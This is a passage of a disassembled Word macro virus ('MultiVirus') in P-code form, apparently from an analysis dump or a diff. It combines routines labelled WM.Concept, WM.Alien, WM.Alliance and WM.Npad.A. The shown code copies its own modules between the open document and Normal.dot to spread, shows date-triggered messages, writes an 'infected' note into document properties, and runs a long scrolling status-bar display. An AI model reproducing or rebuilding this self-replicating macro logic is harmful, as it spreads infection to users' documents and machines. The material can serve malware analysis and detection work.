+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemLd [MacroName$] 0x0002 
+' 	LitStr 0x000A "MultiVirus"
+' 	Eq 
+' 	IfBlock 
+' Line #64:
+' 	LitDI2 0x0001 
+' 	UMi 
+' 	St bInstalled 
+' Line #65:
+' 	EndIfBlock 
+' Line #66:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #67:
+' 	QuoteRem 0x0000 0x000B " WM.Concept"
+' Line #68:
+' 	Ld bInstalled 
+' 	Not 
+' 	IfBlock 
+' Line #69:
+' 	LitStr 0x0001 "1"
+' 	ArgsCall MsgBox 0x0001 
+' Line #70:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x000A "MultiVirus"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #71:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x000B "UserForm900"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #72:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x000B "UserForm999"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #73:
+' 	ElseBlock 
+' Line #74:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x000A "MultiVirus"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #75:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x000B "UserForm900"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #76:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x000B "UserForm999"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #77:
+' 	EndIfBlock 
+' Line #78:
+' 	QuoteRem 0x0000 0x0009 " WM.Alien"
+' Line #79:
+' 	Ld D$ 
+' 	LitStr 0x0005 "01/08"
+' 	Eq 
+' 	IfBlock 
+' Line #80:
+' 	LitStr 0x0019 "Hides the program manager"
+' 	Ld vbCritical 
+' 	LitStr 0x001B "Another Year of Survival..."
+' 	ArgsCall MsgBox 0x0003 
+' Line #81:
+' 	EndIfBlock 
+' Line #82:
+' 	Ld MyWeek 
+' 	LitStr 0x0001 "7"
+' 	Eq 
+' 	IfBlock 
+' Line #83:
+' 	LitStr 0x0013 "Closes current file"
+' 	Ld vbCritical 
+' 	LitStr 0x0020 "It's Sunday & I intend to relax!"
+' 	ArgsCall MsgBox 0x0003 
+' Line #84:
+' 	EndIfBlock 
+' Line #85:
+' 	Ld NomFichier 
+' 	LitDI2 0x0009 
+' 	Lt 
+' 	IfBlock 
+' Line #86:
+' 	LitStr 0x0000 ""
+' 	LitStr 0x0020 "Longer File Names Should Be Used"
+' 	ParamNamed Title 
+' 	ArgsCall MsgBox 0x0002 
+' Line #87:
+' 	EndIfBlock 
+' Line #88:
+' 	QuoteRem 0x0000 0x000B "WM.Alliance"
+' Line #89:
+' 	Ld D1$ 
+' 	LitStr 0x0001 "2"
+' 	Eq 
+' 	Paren 
+' 	Ld D1$ 
+' 	LitStr 0x0001 "7"
+' 	Eq 
+' 	Paren 
+' 	Or 
+' 	Ld D1$ 
+' 	LitStr 0x0002 "11"
+' 	Eq 
+' 	Paren 
+' 	Or 
+' 	Ld D1$ 
+' 	LitStr 0x0002 "12"
+' 	Eq 
+' 	Paren 
+' 	Or 
+' 	IfBlock 
+' Line #90:
+' 	StartWithExpr 
+' 	Ld wdDialogFileSummaryInfo 
+' 	ArgsLd Dialogs 0x0001 
+' 	With 
+' Line #91:
+' 	LitStr 0x0029 "You Have been infected by the Alliance 98"
+' 	MemStWith Subject 
+' Line #92:
+' 	ArgsMemCallWith Execute 0x0000 
+' Line #93:
+' 	EndWith 
+' Line #94:
+' 	EndIfBlock 
+' Line #95:
+' 	QuoteRem 0x0000 0x0009 "WM.Npad.A"
+' Line #96:
+' 	LitStr 0x000E "Microsoft Word"
+' 	LitStr 0x0008 "Compteur"
+' 	LitStr 0x000C "Winword8.ini"
+' 	Ld WordBasic 
+' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
+' 	St WOpen$ 
+' Line #97:
+' 	Ld WOpen$ 
+' 	Ld WordBasic 
+' 	ArgsMemLd Val 0x0001 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St Sales 
+' Line #98:
+' 	LitStr 0x000E "Microsoft Word"
+' 	LitStr 0x0008 "Compteur"
+' 	Ld Sales 
+' 	ArgsLd Str 0x0001 
+' 	LitStr 0x000C "Winword8.ini"
+' 	Ld WordBasic 
+' 	ArgsMemCall SetPrivateProfileString 0x0004 
+' Line #99:
+' 	LitStr 0x000E "Microsoft Word"
+' 	LitStr 0x0008 "Compteur"
+' 	LitStr 0x000C "Winword8.ini"
+' 	Ld WordBasic 
+' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
+' 	St WOpen$ 
+' Line #100:
+' 	Ld WOpen$ 
+' 	LitDI2 0x0017 
+' 	Eq 
+' 	IfBlock 
+' Line #101:
+' 	LitStr 0x00AE "                                                                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #102:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #103:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #104:
+' 	LitStr 0x00AA "                                                                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #105:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #106:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #107:
+' 	LitStr 0x00A6 "                                                                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #108:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #109:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #110:
+' 	LitStr 0x00A2 "                                                                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #111:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #112:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #113:
+' 	LitStr 0x009E "                                                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #114:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #115:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #116:
+' 	LitStr 0x009A "                                                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #117:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #118:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #119:
+' 	LitStr 0x0096 "                                                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #120:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #121:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #122:
+' 	LitStr 0x0092 "                                                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #123:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #124:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #125:
+' 	LitStr 0x008E "                                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #126:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #127:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #128:
+' 	LitStr 0x008A "                                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #129:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #130:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #131:
+' 	LitStr 0x0086 "                                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #132:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #133:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #134:
+' 	LitStr 0x0082 "                                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #135:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #136:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #137:
+' 	LitStr 0x007E "                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #138:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #139:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #140:
+' 	LitStr 0x007A "                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #141:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #142:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #143:
+' 	LitStr 0x0076 "                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #144:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #145:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #146:
+' 	LitStr 0x0072 "                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #147:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #148:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #149:
+' 	LitStr 0x006E "                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #150:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #151:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #152:
+' 	LitStr 0x006A "                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #153:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #154:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #155:
+' 	LitStr 0x0066 "                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #156:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #157:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #158:
+' 	LitStr 0x0062 "                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #159:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #160:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #161:
+' 	LitStr 0x005E "                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #162:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #163:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #164:
+' 	LitStr 0x005A "                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #165:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #166:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #167:
+' 	LitStr 0x0056 "                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #168:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #169:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #170:
+' 	LitStr 0x0052 "                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #171:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #172:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #173:
+' 	LitStr 0x004E "                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #174:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #175:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #176:
+' 	LitStr 0x004A "                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #177:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #178:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #179:
+' 	LitStr 0x0046 "                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #180:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #181:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #182:
+' 	LitStr 0x0042 "                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #183:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #184:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #185:
+' 	LitStr 0x003E "                               DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #186:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #187:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #188:
+' 	LitStr 0x003A "                           DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #189:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #190:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #191:
+' 	LitStr 0x0036 "                       DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #192:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #193:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #194:
+' 	LitStr 0x0032 "                   DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #195:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #196:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #197:
+' 	LitStr 0x002E "               DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #198:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #199:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #200:
+' 	LitStr 0x002A "           DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #201:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #202:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #203:
+' 	LitStr 0x0026 "       DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #204:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #205:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #206:
+' 	LitStr 0x0022 "   DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #207:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #208:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #209:
+' 	LitStr 0x001F "DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #210:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #211:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #212:
+' 	LitStr 0x0022 "   DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #213:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #214:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #215:
+' 	LitStr 0x0026 "       DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #216:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #217:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #218:
+' 	LitStr 0x002A "           DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #219:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #220:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #221:
+' 	LitStr 0x002E "               DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #222:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #223:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #224:
+' 	LitStr 0x0032 "                   DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #225:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #226:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #227:
+' 	LitStr 0x0036 "                       DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #228:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #229:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #230:
+' 	LitStr 0x003A "                           DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #231:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #232:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #233:
+' 	LitStr 0x003E "                               DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #234:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #235:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #236:
+' 	LitStr 0x0042 "                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #237:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #238:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #239:
+' 	LitStr 0x0046 "                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #240:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #241:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #242:
+' 	LitStr 0x004A "                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #243:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #244:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #245:
+' 	LitStr 0x004E "                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #246:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #247:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #248:
+' 	LitStr 0x0052 "                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #249:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #250:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #251:
+' 	LitStr 0x0056 "                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #252:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #253:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #254:
+' 	LitStr 0x005A "                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #255:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #256:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #257:
+' 	LitStr 0x005E "                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #258:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #259:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #260:
+' 	LitStr 0x0062 "                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #261:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #262:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #263:
+' 	LitStr 0x0066 "                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #264:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #265:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #266:
+' 	LitStr 0x006A "                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #267:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #268:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #269:
+' 	LitStr 0x006E "                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #270:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI4 0x1A80 0x0006 
+' 	For 
+' Line #271:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #272:
+' 	LitStr 0x0072 "                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+' 	St StatusBar 
+' Line #273:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
